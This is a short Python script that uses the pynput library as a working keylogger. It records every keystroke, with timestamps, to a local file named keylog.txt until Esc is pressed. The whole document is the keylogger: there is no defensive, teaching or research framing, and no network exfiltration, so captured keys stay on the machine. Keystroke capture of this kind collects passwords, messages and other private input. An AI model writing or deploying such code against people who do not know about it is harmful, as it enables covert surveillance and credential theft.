from pynput import keyboard
import logging

# Set up logging to a file
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
